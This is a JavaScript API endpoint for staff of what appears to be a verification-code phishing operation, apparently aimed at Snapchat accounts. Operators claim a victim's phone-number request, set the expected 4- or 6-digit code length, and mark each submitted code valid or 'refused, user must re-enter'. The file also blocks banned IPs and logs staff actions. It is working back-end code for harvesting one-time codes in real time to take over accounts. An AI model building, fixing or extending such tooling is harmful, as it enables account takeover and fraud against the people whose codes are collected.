/**
 * api/staff-action.js — Staff action endpoint
 *
 * BUG 5 FIX: claim now uses WHERE status='pending' with RETURNING id
 *            → if another staff already claimed, rowCount=0 → error returned
 * BUG 8 FIX: unclaim action is now logged in snap_logs
 */

import { neon } from "@neondatabase/serverless";
import { checkBannedIP } from "./middleware.js";

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    if (req.method === "OPTIONS") { res.status(200).end(); return; }
    if (req.method !== "POST") return res.status(405).json({ success: false });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { action, phone, length, secret, staff_tag } = req.body;

        if (secret !== process.env.STAFF_SECRET) {
            return res.status(401).json({ success: false, message: "Unauthorized" });
        }

        const sql = neon(process.env.DATABASE_URL);

        // ─── CLAIM ────────────────────────────────────────────────────────────
        // BUG 5 FIX: conditional update — only if still pending
        if (action === "claim") {
            const result = await sql`
                UPDATE snap_requests
                SET status = 'processing'
                WHERE phone = ${phone} AND status = 'pending'
                RETURNING id
            `;

            if (result.length === 0) {
                // Already claimed or doesn't exist
                return res.status(409).json({
                    success: false,
                    message: "Request already claimed or not found.",
                });
            }

            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('claim', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}

            return res.status(200).json({ success: true, message: "Request claimed" });
        }

        // ─── SET LENGTH ───────────────────────────────────────────────────────
        if (action === "set_length") {
            const len = Number(length);
            if (![4, 6].includes(len)) {
                return res.status(400).json({
                    success: false,
                    message: "Invalid length — must be 4 or 6",
                });
            }
            await sql`
                UPDATE snap_requests
                SET status = 'waiting_code', code_length = ${len}
                WHERE phone = ${phone}
            `;
            return res.status(200).json({
                success: true,
                message: `Code length set to ${len}`,
            });
        }

        // ─── WRONG NUMBER ─────────────────────────────────────────────────────
        if (action === "wrong_number") {
            await sql`
                UPDATE snap_requests SET status = 'wrong_number' WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('wrong_number', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Wrong number reported" });
        }

        // ─── TRUE CODE ────────────────────────────────────────────────────────
        if (action === "true_code") {
            await sql`
                UPDATE snap_requests SET status = 'completed' WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('true_code', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Code validated" });
        }

        // ─── FALSE CODE ───────────────────────────────────────────────────────
        if (action === "false_code") {
            await sql`
                UPDATE snap_requests SET status = 'retry_code' WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('false_code', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({
                success: true,
                message: "Code refused, user must re-enter",
            });
        }

        // ─── UNCLAIM ──────────────────────────────────────────────────────────
        // BUG 8 FIX: unclaim is now logged
        if (action === "unclaim") {
            await sql`
                UPDATE snap_requests SET status = 'pending' WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('unclaim', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({
                success: true,
                message: "Request unclaimed and returned to pending",
            });
        }

        return res.status(400).json({ success: false, message: "Unknown action" });
    } catch (e) {
        console.error("staff-action error:", e);
        return res.status(500).json({ success: false, message: e.message });
    }
}
